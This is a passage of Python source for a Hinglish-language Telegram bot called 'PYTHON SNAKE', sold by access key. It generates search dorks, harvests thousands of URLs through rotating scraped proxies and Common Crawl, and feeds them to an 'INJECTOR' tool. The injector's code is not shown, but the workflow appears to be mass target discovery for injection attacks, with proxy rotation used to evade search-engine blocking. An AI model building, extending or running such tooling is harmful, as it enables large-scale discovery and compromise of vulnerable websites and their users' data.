    dorks = context.user_data.get("last_dorks") or []
    if not dorks:
        try:
            await q.answer("Pehle DORKER chalao", show_alert=True)
        except Exception:
            pass
        return
    context.user_data["parse_dorks"] = dorks[:1000]
    doms = domains_from_dorks(dorks)
    extra = ("\n🌐 <b>%d domain</b> mile → Common Crawl se bhi URLs aayenge" % len(doms)) if doms else ""
    try:
        await q.edit_message_text(
            H("DEEP SCAN", "sab dorks • poore stats") + "\n\n"
            "🎯 Dorks: <b>%d</b>%s\n\n"
            "Max URLs kitne chahiye? <b>Number bhejo</b> (10 – 100000)\n"
            "<i>Recommended: 5000 (bada number = zyada time)</i>" % (len(dorks), extra),
            parse_mode=ParseMode.HTML, reply_markup=kb_back("m:parse"))
    except Exception:
        pass
    context.user_data["await"] = "deep_max"


async def input_deep_max(update, context, text: str):
    import re as _re
    try:
        mx = int(_re.sub(r"[^0-9]", "", text) or "5000")
    except Exception:
        mx = 5000
    mx = max(50, min(100000, mx))
    dorks = context.user_data.get("parse_dorks") or context.user_data.get("last_dorks") or []
    if not dorks:
        await update.effective_message.reply_text("❌ Dork nahi mile. DORKER chalao.")
        return
    msg = await update.effective_message.reply_text(
        "🚀 <b>DEEP SCAN chalu…</b>\n0 / %d dorks" % len(dorks), parse_mode=ParseMode.HTML)
    t0 = time.time()
    last = {"t": 0.0}

    async def prog(st):
        if time.time() - last["t"] < 2.5:
            return
        last["t"] = time.time()
        pct = st["scanned"] / max(1, st["total"]) * 100
        try:
            await msg.edit_text(
                "🌐 <b>%s</b>\n%s\n\n"
                "Scanned : <code>%d/%d</code>\n"
                "Raw URLs: <code>%s</code>\n"
                "Unique  : <code>%s</code>\n"
                "Errors  : <code>%s</code>\n\n"
                "[%s] <b>%.0f%%</b>"
                % (F("DEEP PARSER — RUNNING", T()["head"]), T()["div"][:20],
                   st["scanned"], st["total"], fmt(st["raw"]), fmt(st["unique"]),
                   fmt(st["errors"]), bar(pct, 22), pct),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

    res = await parse_deep(dorks, max_urls=mx, pages=int(sget("parse_pages", 1) or 1),
                           use_proxy=bool(PROXIES or load_proxy_pool()), progress=prog)
    took = time.time() - t0
    st = res["stats"]
    urls = res["urls"]
    context.user_data["last_urls"] = urls
    eng = ", ".join("%s:%d" % (a, b) for a, b in
                    sorted(st["engine_hits"].items(), key=lambda z: -z[1])[:4]) or "—"
    card = (H("DEEP PARSER — COMPLETE", "%.1fs" % took) + "\n\n"
            "Scanned: <code>%d/%d</code> dorks\n"
            "Raw URLs: <code>%s</code>\n"
            "Unique URLs: <code>%s</code>\n"
            "⚠️ Errors: <code>%s</code>\n\n"
            "🚫 Filtered: <code>%s</code>\n"
            "   <i>(junk %s • dork-mismatch %s)</i>\n\n"
            "🌐 Common Crawl: <code>%s</code>\n"
            "🐦 Google (free): <code>%s</code>\n"
            "🔑 API: <code>%s</code>\n"
            "⚙️ Engines: <code>%s</code>\n\n"
            "[%s] <b>100%%</b>\n\n"
            "📦 <b>Files ready</b>"
            % (st["scanned"], st["total"], fmt(st["raw"]), fmt(st["unique"]),
               fmt(st["errors"]), fmt(st["filtered"]), fmt(st["junk"]),
               fmt(st["mismatch"]), fmt(st["cc"]), fmt(st.get("gj", 0)), fmt(st["api"]), esc(eng),
               bar(100, 22)))
    try:
        await msg.delete()
    except Exception:
        pass
    for ch in chunk_lines(card)[:2]:
        await update.effective_message.reply_text(ch, parse_mode=ParseMode.HTML)
    if urls:
        path, cnt = dump_text(urls, "deep", "PYTHON SNAKE — deep scan")
        await send_file(update, path, "🌐 %d unique URLs" % cnt)
        try:
            js = dump_json({"stats": {k: (v if not isinstance(v, dict) else dict(v))
                                      for k, v in st.items()}, "urls": urls[:5000]}, "deepstats")
            await send_file(update, js, "📊 stats")
        except Exception:
            pass
    else:
        await update.effective_message.reply_text(
            "❌ 0 URLs — sab engines block/empty the.\n"
            "👉 🧅 PROXY ENGINE se proxies add karo, phir dobara.",
            reply_markup=kb_back("m:parse"))
    await update.effective_message.reply_text("⬅️ Menu", reply_markup=kb_back("m:home"))
    context.user_data.pop("await", None)


async def input_parse_dorks(update, context, text: str):
    dorks = [x.strip() for x in text.split("\n") if x.strip()][:50]
    if not dorks:
        await update.effective_message.reply_text("❌ Koi dork nahi mila.")
        return
    context.user_data["parse_dorks"] = dorks
    await update.effective_message.reply_text(
        H("PARSER") + "\n\n<b>%d dorks</b> mile.\nKitne URLs chahiye? Number bhejo\n"
        "<i>Recommended: 100</i>" % len(dorks), parse_mode=ParseMode.HTML,
        reply_markup=kb_back("m:parse"))


async def input_parse_max(update, context, text: str):
    try:
        mx = int(re.sub(r"[^0-9]", "", text) or "100")
    except Exception:
        mx = 100
    mx = max(5, min(20000, mx))
    dorks = context.user_data.get("parse_dorks") or context.user_data.get("last_dorks") or []
    if not dorks:
        await update.effective_message.reply_text("❌ Dork nahi mile. DORKER chalao.")
        return
    msg = await update.effective_message.reply_text(
        "⏳ Parsing chal rahi hai…\n🎯 %d dorks → max %d URLs" % (len(dorks), mx))
    t0 = time.time()
    last = {"t": 0.0}

    async def prog(st):
        if time.time() - last["t"] < 3:
            return
        last["t"] = time.time()
        try:
            await msg.edit_text(
                "🔍 <b>%s</b>\n" % F("PARSING — LIVE", T()["head"]) + T()["div"] +
                "\n🎯 Dorks   : <code>%d/%d</code> %s\n🔗 URLs    : <code>%s</code>\n"
                "⏱ Time    : <code>%.0fs</code>"
                % (st["dorks"], st["total"],
                   bar(st["dorks"] / max(1, st["total"]) * 100),
                   fmt(st["urls"]), time.time() - t0),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

    res = await parse(dorks, max_urls=mx, pages=sget("parse_pages", 1),
                      use_proxy=bool(PROXIES or load_proxy_pool()), progress=prog)
    took = time.time() - t0
    urls = res["urls"]
    context.user_data["last_urls"] = urls
    st = res["stats"]
    if not urls:
        blocked = st["blocked"]
        txt = (H("PARSER — 0 URLs") + "\n\n"
               "❌ Koi URL nahi mila.\n\n"
               "🔍 Queries   : <code>%d</code>\n"
               "🚫 Blocked   : <code>%d</code>\n"
               "🧅 Proxies   : <code>%d</code>\n\n"
               "👉 <b>Proxy add karo</b> — 🧅 PROXY ENGINE se\n"
               "👉 Ya mode badlo: dork simple karo\n"
               "👉 Ya thodi der baad try karo (engine rate-limit)"
               % (st["queries"], blocked, len(PROXIES)))
    else:
        eng = ", ".join("%s:%d" % (k, v) for k, v in sorted(st["engine_hits"].items(), key=lambda z: -z[1])[:4])
        txt = (H("PARSER — DONE") + "\n\n"
               "🔗 URLs      : <code>%s</code>\n"
               "🎯 Dorks     : <code>%d</code>\n"
               "🔍 Queries   : <code>%d</code>\n"
               "🚫 Blocked   : <code>%d</code>\n"
               "⏱ Time      : <code>%.1fs</code>\n"
               "⚙️ Engines   : <code>%s</code>\n\n%s"
               % (fmt(len(urls)), len(dorks), st["queries"], st["blocked"], took, esc(eng),
                  short_list(urls[:10], 10)))
    try:
        await msg.delete()
    except Exception:
        pass
    for ch in chunk_lines(txt)[:3]:
        await update.effective_message.reply_text(ch, parse_mode=ParseMode.HTML)
    if urls:
        path, cnt = dump_text(urls, "parser", "PYTHON SNAKE — parsed URLs")
        await send_file(update, path, "🔍 %d real URLs" % cnt)
    await update.effective_message.reply_text("⬅️ Menu", reply_markup=kb_back("m:home"))
    context.user_data.pop("await", None)


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: PROXY
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_proxy(update, context):
    q = update.callback_query
    pool = PROXIES or load_proxy_pool()
    txt = (H("PROXY ENGINE", "%d sources • DoH bypass • 400 parallel" % len(PROXY_SOURCES)) + "\n\n"
           "🧅 Pool abhi : <code>%d</code> proxies\n"
           "📄 Manual    : <code>%d</code> (data/manual_proxies.txt)\n\n"
           "Scan chalu karein?" % (len(pool), len(manual_proxies())))
    kb = RK([
        [InlineKeyboardButton("🚀 SCRAPE + CHECK", callback_data="px:run")],
        [InlineKeyboardButton("📊 POOL STATUS", callback_data="px:stat")],
        [InlineKeyboardButton("🗑 CLEAR", callback_data="px:clear")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
    ])
    try:
        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_proxy_run(update, context):
    q = update.callback_query
    t0 = time.time()
    await q.edit_message_text("⏳ <b>Step 1/2</b> — 45 sources scrape ho rahe hain…",
                              parse_mode=ParseMode.HTML)

    async def src_prog(st):
        try:
            await q.edit_message_text(
                "🧅 <b>%s</b>\n" % F("SCRAPING", T()["head"]) + T()["div"] +
                "\n📡 Sources : <code>%d/%d</code> %s\n✅ OK      : <code>%d</code>\n"
                "🔢 Mila    : <code>%s</code>"
                % (st["done"], st["total"], bar(st["done"] / max(1, st["total"]) * 100),
                   st["ok"], fmt(st["px"])), parse_mode=ParseMode.HTML)
        except Exception:
            pass

    px = await scrape_proxies(progress=src_prog, force=True)
    px = _uniq(px + manual_proxies())
    if not px:
        await q.edit_message_text(
            (H("PROXY — 0 MILE") + "\n\n"
             "❌ Koi source khula hi nahi.\n\n"
             "🌐 Sources : <code>0/%d</code>\n\n"
             "👉 <b>Net/DNS block</b> lag raha hai:\n"
             "• WiFi ↔ mobile data switch karo\n"
             "• Ya <code>data/manual_proxies.txt</code> me proxies daalo\n"
             "   (1 line = 1 proxy, jaise <code>1.2.3.4:8080</code>)"
             % len(PROXY_SOURCES)),
            reply_markup=kb_back("m:proxy"), parse_mode=ParseMode.HTML)
        return

    await q.edit_message_text("⏳ <b>Step 2/2</b> — %s proxies check ho rahe hain…\n"
                              "<i>(400 parallel — fast)</i>" % fmt(len(px)),
                              parse_mode=ParseMode.HTML)

    async def chk_prog(st):
        try:
            await q.edit_message_text(
                "🔍 <b>%s</b>\n" % F("CHECKING", T()["head"]) + T()["div"] +
                "\n📥 Total   : <code>%s</code>\n🔍 Checked : <code>%s/%s</code> %s\n"
                "✅ Alive   : <code>%d</code>"
                % (fmt(st["total"]), fmt(st["done"]), fmt(st["total"]),
                   bar(st["done"] / max(1, st["total"]) * 100), st["alive"]),
                parse_mode=ParseMode.HTML)
        except Exception:
            pass

    good = await check_proxies(px[:4000], concurrency=400, timeout=6.0,
                               progress=chk_prog, want=200)
    save_proxy_pool(good)
    took = time.time() - t0
    src_ok = PROXIES and PSTATS.get("sources_ok", 0)
    txt = (H("PROXY — DONE") + "\n\n"
           "📥 Scraped  : <code>%s</code>\n"
           "🔍 Checked  : <code>%s</code>\n"
           "✅ Alive    : <code>%d</code>\n"
           "⏱ Time     : <code>%.1fs</code>\n\n"
           "🌐 Sources  : <code>%d/%d</code> OK • raw lines: <code>%s</code>"
           % (fmt(len(px)), fmt(min(len(px), 4000)), len(good), took,
              PSTATS.get("sources_ok", 0), len(PROXY_SOURCES), fmt(PSTATS.get("raw", 0))))
    if good:
        txt += "\n⚡ Best: <code>%d ms</code>\n\n<b>Top 5:</b>\n%s" % (
            good[0]["ms"], "\n".join("• <code>%s</code> — %dms"
                                     % (esc(g["url"].replace("http://", "")), g["ms"])
                                     for g in good[:5]))
        txt += "\n\n✅ Parser ab inhe use karega."
    elif PSTATS.get("sources_ok", 0) == 0:
        txt += ("\n\n⚠️ <b>Koi source khula hi nahi</b> — net/DNS block.\n"
                "👉 WiFi ↔ mobile data switch karo, ya manual file banao.")
    else:
        txt += ("\n\n⚠️ Sources khule par koi proxy alive nahi.\n"
                "👉 Thodi der baad dobara scan karo.")
    kb = RK([
        [InlineKeyboardButton("🔁 SCAN AGAIN", callback_data="px:run")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:proxy")],
    ])
    try:
        await q.edit_message_text(txt, reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_proxy_stat(update, context):
    q = update.callback_query
    pool = PROXIES or load_proxy_pool()
    d = jload("proxies", {})
    txt = (H("PROXY POOL") + "\n\n"
           "✅ Alive    : <code>%d</code>\n"
           "📄 Manual   : <code>%d</code>\n"
           "🕐 Updated  : <code>%s</code>\n\n%s"
           % (len(pool), len(manual_proxies()), esc(d.get("at") or "—"),
              short_list([p["url"].replace("http://", "") + (" (%dms)" % p.get("ms", 0))
                          for p in pool[:12]], 12)))
    try:
        await q.edit_message_text(txt, reply_markup=kb_back("m:proxy"), parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_proxy_clear(update, context):
    q = update.callback_query
    save_proxy_pool([])
    try:
        await q.edit_message_text(H("PROXY") + "\n\n🗑 Pool clear ho gaya.",
                                  reply_markup=kb_back("m:proxy"), parse_mode=ParseMode.HTML)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════════════════
#  TOOL: QUALITY / RANDOMIZER / DUMPER
# ═══════════════════════════════════════════════════════════════════════════════
async def tool_qa(update, context):
    q = update.callback_query
    txt = (H("QUALITY CHECK") + "\n\n"
           "Dork/keyword paste karo (ek line me ek) — har ek ko <b>0-100</b> score "
           "dunga + wajah bataunga.")
    try:
        await q.edit_message_text(txt, reply_markup=kb_back(), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "qa_items"


async def input_qa(update, context, text: str):
    items = [x.strip() for x in text.split("\n") if x.strip()][:40]
    if not items:
        await update.effective_message.reply_text("❌ Kuch nahi mila.")
        return
    lines, scores = [], []
    for it in items:
        sc, why = score_dork(it) if re.search(r"(inurl|intitle|intext|site|filetype):", it, re.I) else score_keyword(it)
        scores.append(sc)
        lines.append("<b>%d/100</b> %s\n<code>%s</code>\n<i>%s</i>"
                     % (sc, quality_label(sc), esc(it[:120]), esc("; ".join(why[:3]))))
    avg = sum(scores) / len(scores)
    body = (H("QUALITY REPORT", "avg %.0f/100" % avg) + "\n\n" + "\n\n".join(lines[:12]))
    for ch in chunk_lines(body)[:3]:
        await update.effective_message.reply_text(ch, parse_mode=ParseMode.HTML)
    if len(items) > 12:
        await update.effective_message.reply_text("…+%d aur (file me)" % (len(items) - 12))
    path, cnt = dump_text(["%3d  %s" % (s, i) for s, i in zip(scores, items)], "quality",
                          "PYTHON SNAKE — quality scores")
    await send_file(update, path, "📊 %d scored" % cnt)
    context.user_data.pop("await", None)


async def tool_rand(update, context):
    q = update.callback_query
    last = context.user_data.get("last_dorks") or []
    kb = RK([
        [InlineKeyboardButton("📥 LAST %d DORKS" % len(last), callback_data="rd:last")],
        [InlineKeyboardButton("✍️ MANUAL", callback_data="rd:manual")],
        [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")],
    ])
    try:
        await q.edit_message_text(H("RANDOMIZER") + "\n\n"
                                  "Dorks ko shuffle + operator mutate karta hai "
                                  "(inurl ↔ allinurl, site ↔ site:.com …)",
                                  reply_markup=kb, parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_rand_last(update, context):
    q = update.callback_query
    dorks = context.user_data.get("last_dorks") or []
    if not dorks:
        try:
            await q.answer("Pehle DORKER chalao", show_alert=True)
        except Exception:
            pass
        return
    out = randomize_dorks(dorks, n=min(len(dorks) * 2, 300))
    path, cnt = dump_text(out, "random", "PYTHON SNAKE — randomized dorks")
    try:
        await q.edit_message_text(H("RANDOMIZER — DONE") + "\n\n🔀 %s dorks\n\n%s"
                                  % (fmt(cnt), short_list(out[:10], 10)),
                                  reply_markup=kb_back("m:rand"), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    await send_file(update, path, "🎲 %d randomized" % cnt)


async def cb_rand_manual(update, context):
    q = update.callback_query
    try:
        await q.edit_message_text(H("RANDOMIZER") + "\n\nDorks paste karo:",
                                  reply_markup=kb_back("m:rand"), parse_mode=ParseMode.HTML)
    except Exception:
        pass
    context.user_data["await"] = "rand_items"


async def input_rand(update, context, text: str):
    items = [x.strip() for x in text.split("\n") if x.strip()]
    if not items:
        return
    out = randomize_dorks(items, n=min(len(items) * 2, 300))
    path, cnt = dump_text(out, "random", "PYTHON SNAKE — randomized dorks")
    await update.effective_message.reply_text(
        H("RANDOMIZER — DONE") + "\n\n🔀 %s dorks\n\n%s" % (fmt(cnt), short_list(out[:8], 8)),
        parse_mode=ParseMode.HTML, reply_markup=kb_back("m:rand"))
    await send_file(update, path, "🎲 %d randomized" % cnt)
    context.user_data.pop("await", None)


async def tool_dump(update, context):
    q = update.callback_query
    files = dumps_list(12)
    if not files:
        try:
            await q.edit_message_text(H("DUMPER") + "\n\n📭 Abhi koi file nahi bani.",
                                      reply_markup=kb_back(), parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return
    rows = [[InlineKeyboardButton("📄 %s (%.0f KB)" % (os.path.basename(f)[:28],
                                                       os.path.getsize(f) / 1024),
                                  callback_data="df:%d" % i)]
            for i, f in enumerate(files)]
    rows.append([InlineKeyboardButton("📦 SAB ZIP", callback_data="df:zip")])
    rows.append([InlineKeyboardButton("⬅️ BACK", callback_data="m:home")])
    try:
        await q.edit_message_text(H("DUMPER", "%d files" % len(files)) + "\n\nKaun si file?",
                                  reply_markup=RK(rows), parse_mode=ParseMode.HTML)
    except Exception:
        pass


async def cb_dump_file(update, context):
    q = update.callback_query
    arg = q.data.split(":", 1)[1]
    files = dumps_list(12)
    if arg == "zip":
        name = os.path.join(DUMP_DIR, "all_dumps_%s.zip" % stamp())
        try:
            with zipfile.ZipFile(name, "w", zipfile.ZIP_DEFLATED) as zf:
                for f in dumps_list(60):
                    zf.write(f, arcname=os.path.basename(f))
        except Exception as exc:
            try:
                await q.answer("ZIP fail: %s" % exc, show_alert=True)
            except Exception:
                pass
            return
        await send_file(update, name, "📦 saare dumps")
        return
    try:
        idx = int(arg)
        await send_file(update, files[idx], "📄 " + os.path.basename(files[idx]))
    except Exception:
        try:
            await q.answer("File nahi mili", show_alert=True)
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════════════════
#  📂 FILE UPLOAD — dork / URL / keyword .txt bhejo
# ═══════════════════════════════════════════════════════════════════════════════
FILE_MAX = 8 * 1024 * 1024          # 8 MB
FILE_MAX_LINES = 20000
DORK_OP = re.compile(r"(inurl|intitle|intext|allinurl|allintitle|site|filetype|ext|"
                     r"inanchor|allintext)\s*:", re.I)


def classify_lines(lines: list) -> str:
    """dorks / urls / keywords — auto detect."""
    n = max(1, len(lines))
    urls = sum(1 for l in lines if l.lower().startswith(("http://", "https://")))
    dorks = sum(1 for l in lines if DORK_OP.search(l))
    if urls / n > 0.5:
        return "urls"
    if dorks / n > 0.25:
        return "dorks"
    return "keywords"


def read_lines(raw: bytes) -> list:
    txt = raw.decode("utf-8", "ignore")
    out = []
    for line in txt.replace("\r\n", "\n").replace("\r", "\n").split("\n"):
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        out.append(line)
        if len(out) >= FILE_MAX_LINES:
            break
    return out


def kb_file(kind: str) -> InlineKeyboardMarkup:
    if kind == "dorks":
        rows = [[InlineKeyboardButton("🚀 DEEP SCAN", callback_data="f:deep")],
                [InlineKeyboardButton("📊 ANALYZE", callback_data="f:ana"),
                 InlineKeyboardButton("🎲 RANDOMIZE", callback_data="f:rnd")],
                [InlineKeyboardButton("💉 INJECTOR", callback_data="f:inj")],
                [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")]]
    elif kind == "urls":
        rows = [[InlineKeyboardButton("🔗 URL REVERSE", callback_data="f:rev")],
                [InlineKeyboardButton("💉 INJECTOR", callback_data="f:inj"),
                 InlineKeyboardButton("🧹 CLEAN + DEDUPE", callback_data="f:clean")],
                [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")]]
    else:
        rows = [[InlineKeyboardButton("📊 QUALITY CHECK", callback_data="f:kqual")],
                [InlineKeyboardButton("🔁 EXPAND (aur banao)", callback_data="f:kexp")],
                [InlineKeyboardButton("⬅️ BACK", callback_data="m:home")]]
    return RK(rows)


async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """User .txt bheje — dorks / URLs / keywords — auto detect + actions."""
    uid = update.effective_user.id
    doc = getattr(update.message, "document", None)
    if not doc:
        return
    if not is_verified(context, uid):
        q, kb = captcha_new(context)
        await update.message.reply_text(q, reply_markup=kb, parse_mode=ParseMode.HTML)
        return
    if not access_ok(uid):
        await update.message.reply_text(need_key_text(uid), parse_mode=ParseMode.HTML,
                                        reply_markup=kb_needkey())
        return
    name = doc.file_name or "file.txt"
    size = int(doc.file_size or 0)
    if size > FILE_MAX:
        await update.message.reply_text(
            "❌ File bahut badi hai (%.1f MB). Max 8 MB." % (size / 1024 / 1024))
        return
    if not re.search(r"\.(txt|csv|list|dork|urls?|lst)$", name, re.I):
        await update.message.reply_text(
            "❌ Sirf <code>.txt</code> / <code>.csv</code> / <code>.list</code> bhejo.\n"
            "<i>Word/PDF support nahi hai.</i>", parse_mode=ParseMode.HTML)
        return
    msg = await update.message.reply_text("📂 File padh raha hoon…")
    try:
        tg_file = await doc.get_file()
        raw = bytes(await tg_file.download_as_bytearray())
    except Exception as exc:
        try:
            await msg.edit_text("❌ File download fail: <code>%s</code>" % esc(str(exc)[:120]),
                                parse_mode=ParseMode.HTML)
        except Exception:
            pass
        return
    lines = read_lines(raw)
    if not lines:
        try:
            await msg.edit_text("❌ File khaali hai (ya sirf comments).")
        except Exception:
            pass
        return
    kind = classify_lines(lines)
    context.user_data["file_items"] = lines
    context.user_data["file_kind"] = kind
    context.user_data["file_name"] = name
    if kind == "dorks":
        context.user_data["last_dorks"] = lines
    elif kind == "urls":
        context.user_data["last_urls"] = lines

    label = {"dorks": "🎯 DORKS", "urls": "🔗 URLs", "keywords": "🔑 KEYWORDS"}[kind]
    ops = sum(1 for l in lines if DORK_OP.search(l))
    doms = domains_from_dorks(lines)
    extra = ""
    if doms:
        extra = "\n🌐 site: domains: <code>%d</code> (Common Crawl use hoga)" % len(doms)
    card = (H("FILE LOADED", "%s • %s" % (label, esc(name)[:40])) + "\n\n"
            "📄 Lines   : <code>%s</code>\n"
            "📦 Size    : <code>%.1f KB</code>\n"
            "🏷 Type    : <b>%s</b>\n"
            "⚙️ Operators: <code>%d</code>%s\n\n"
            "<b>Preview:</b>\n%s\n\n"
            "👇 Kya karna hai?"
            % (fmt(len(lines)), size / 1024, label, ops, extra,
               short_list(lines[:6], 6)))
    try:
        await msg.delete()
    except Exception:
        pass
    await update.message.reply_text(card, parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))


async def cb_file(update, context, action: str):
    q = update.callback_query
    items = context.user_data.get("file_items") or []
    kind = context.user_data.get("file_kind") or "dorks"
    if not items:
        try:
            await q.answer("Pehle file bhejo", show_alert=True)
        except Exception:
            pass
        return

    if action == "deep":
        context.user_data["parse_dorks"] = items[:1000]
        doms = domains_from_dorks(items)
        try:
            await q.edit_message_text(
                H("DEEP SCAN", "%d dorks" % len(items)) + "\n\n"
                "Max URLs kitne chahiye? <b>Number bhejo</b>\n"
                "<i>Recommended: 5000</i>%s"
                % (("\n\n🌐 <b>%d domain</b> — Common Crawl se bhi aayenge" % len(doms)) if doms else ""),
                parse_mode=ParseMode.HTML, reply_markup=kb_back("m:parse"))
        except Exception:
            pass
        context.user_data["await"] = "deep_max"
        return

    if action == "ana":
        scores = [(score_dork(x)[0] if DORK_OP.search(x) else score_keyword(x)[0]) for x in items]
        avg = sum(scores) / len(scores) if scores else 0
        buckets = {"🔥 80+": 0, "✅ 65-79": 0, "🟡 45-64": 0, "🟠 25-44": 0, "🔴 <25": 0}
        for sc in scores:
            if sc >= 80: buckets["🔥 80+"] += 1
            elif sc >= 65: buckets["✅ 65-79"] += 1
            elif sc >= 45: buckets["🟡 45-64"] += 1
            elif sc >= 25: buckets["🟠 25-44"] += 1
            else: buckets["🔴 <25"] += 1
        best = sorted(zip(scores, items), key=lambda z: -z[0])[:8]
        txt = (H("FILE ANALYZE", "%d items" % len(items)) + "\n\n"
               "⭐ Average: <code>%.0f/100</code>\n\n"
               + "\n".join("%s : <code>%s</code>" % (kk, fmt(vv)) for kk, vv in buckets.items())
               + "\n\n<b>Top 8:</b>\n" + short_list([b for _, b in best], 8))
        try:
            await q.edit_message_text(txt, parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))
        except Exception:
            pass
        path, cnt = dump_text(["%3d  %s" % (sco, it) for sco, it in zip(scores, items)],
                              "file_analyze", "PYTHON SNAKE — file analyze")
        await send_file(update, path, "📊 %d scored" % cnt)
        return

    if action == "rnd":
        out = randomize_dorks(items, n=min(len(items) * 2, 2000))
        context.user_data["last_dorks"] = out
        path, cnt = dump_text(out, "random", "PYTHON SNAKE — randomized")
        try:
            await q.edit_message_text(
                H("RANDOMIZED", "%d → %d" % (len(items), len(out))) + "\n\n"
                + short_list(out[:10], 10), parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))
        except Exception:
            pass
        await send_file(update, path, "🎲 %d randomized" % cnt)
        return

    if action == "rev":
        infos = [url_reverse(u) for u in items[:20]]
        infos = [i for i in infos if i]
        dorks = []
        for i in infos:
            dorks += url_reverse_dorks(i, n=12)
        dorks = _uniq(dorks)
        context.user_data["last_dorks"] = dorks
        path, cnt = dump_text(dorks, "url_reverse", "PYTHON SNAKE — reverse dorks")
        try:
            await q.edit_message_text(
                H("URL REVERSE", "%d URLs → %d dorks" % (len(infos), cnt)) + "\n\n"
                + short_list(dorks[:10], 10), parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))
        except Exception:
            pass
        await send_file(update, path, "🔗 %d dorks" % cnt)
        return

    if action == "clean":
        seen, clean = set(), []
        for u in items:
            cu = _clean_url(u)
            if not cu:
                continue
            k = cu.split("#")[0].rstrip("/")
            if k in seen:
                continue
            seen.add(k)
            clean.append(cu)
        context.user_data["last_urls"] = clean
        path, cnt = dump_text(clean, "clean_urls", "PYTHON SNAKE — cleaned URLs")
        try:
            await q.edit_message_text(
                H("CLEAN + DEDUPE", "%.0f%% bache" % (len(clean) / max(1, len(items)) * 100)) + "\n\n"
                "📥 Input : <code>%s</code>\n"
                "🧹 Junk  : <code>%s</code>\n"
                "✅ Clean : <code>%s</code>\n\n%s"
                % (fmt(len(items)), fmt(len(items) - len(clean)), fmt(cnt),
                   short_list(clean[:8], 8)),
                parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))
        except Exception:
            pass
        await send_file(update, path, "🧹 %d clean URLs" % cnt)
        return

    if action == "kqual":
        kws = [str(x) for x in items if x]
        qrep = kw_quality(kws)
        body = (H("KEYWORD QUALITY", "avg %.0f/100" % qrep["avg"]) + "\n\n"
                "📦 Total : <code>%s</code>\n\n"
                "🔥 80+   : <code>%s</code>\n"
                "✅ 65-79 : <code>%s</code>\n"
                "🟡 45-64 : <code>%s</code>\n"
                "🟠 25-44 : <code>%s</code>\n"
                "🔴 <25   : <code>%s</code>\n\n"
                "<b>Top 6:</b>\n%s\n"
                "<b>Kamzor 4:</b>\n%s"
                % (fmt(qrep["total"]), fmt(qrep["b80"]), fmt(qrep["b65"]),
                   fmt(qrep["b45"]), fmt(qrep["b25"]), fmt(qrep["b0"]),
                   short_list(qrep["top"][:6], 6), short_list(qrep["worst"][:4], 4)))
        try:
            await q.edit_message_text(body, parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))
        except Exception:
            pass
        hq = [k for k in kws if score_keyword(k)[0] >= 80]
        if hq:
            path, cnt = dump_text(hq, "keywords_hq", "PYTHON SNAKE — HQ only (80+)")
            await send_file(update, path, "🔥 %s HQ keywords (80+)" % fmt(cnt))
        return

    if action == "kexp":
        context.user_data["kw_items"] = items
        cap = kw_capacity(kw_cores(items))
        try:
            await q.edit_message_text(
                (H("EXPAND KEYWORDS", "%s lines" % fmt(len(items))) + "\n\n"
                 "📊 Max : <code>%s</code>\n\n"
                 "Kitne keywords chahiye? <b>Number bhejo</b> (1 – %s)\n"
                 "<i>Recommended: 5,000</i>" % (fmt(min(cap, KW_MAX)), fmt(KW_MAX))),
                parse_mode=ParseMode.HTML, reply_markup=kb_file(kind))
        except Exception:
            pass
        context.user_data["await"] = "kw_count"
        return

    if action == "inj":
        await _run_inject(update, context, [x for x in items if x.startswith("http")][:200]
                          or items[:200])
        return


# ═══════════════════════════════════════════════════════════════════════════════
#  TEXT ROUTER
# ═══════════════════════════════════════════════════════════════════════════════
AWAIT_HANDLERS = {
    "dork_count": input_dork_count,
    "dork_domain": input_dork_domain,
    "kw_input": input_kw_input,
    "kw_count": input_kw_count,
    "rev_urls": input_rev_urls,
    "inj_urls": input_inj_urls,
    "parse_dorks": input_parse_dorks,
    "parse_max": input_parse_max,
    "qa_items": input_qa,
    "rand_items": input_rand,
    "key_redeem": None,
    "bc_text": None,
    "deep_max": None,
}


async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    text = (update.message.text or "").strip()
    if not is_verified(context, uid):
        q, kb = captcha_new(context)
        await update.message.reply_text(q, reply_markup=kb, parse_mode=ParseMode.HTML)
        return

    # 🔑 REDEEM pehle — access gate se PEHLE, warna key type hi nahi ho sakti
    wait = context.user_data.get("await")
    if wait == "key_redeem":
        context.user_data.pop("await", None)
        context.user_data.pop("await_admin", None)
        return await input_redeem(update, context, text)
    up = text.upper()
    if not access_ok(uid) and (KEY_RE.match(up) or up in KEYS):
        context.user_data.pop("await", None)
        return await input_redeem(update, context, up)

    if not access_ok(uid):
        await update.message.reply_text(need_key_text(uid), parse_mode=ParseMode.HTML,
                                        reply_markup=kb_needkey())
        return
    if context.user_data.get("await_admin") and not is_admin(uid):
        context.user_data.pop("await", None)
        context.user_data.pop("await_admin", None)
        return
    fn = AWAIT_HANDLERS.get(wait)
    if fn:
        context.user_data.pop("await", None)
        context.user_data.pop("await_admin", None)
        return await fn(update, context, text)
    await update.message.reply_text("🤔 Samajh nahi aaya. Menu se tool chuno:",
                                    reply_markup=kb_main())

TOOL_HANDLERS = {
    "dork": tool_dork,
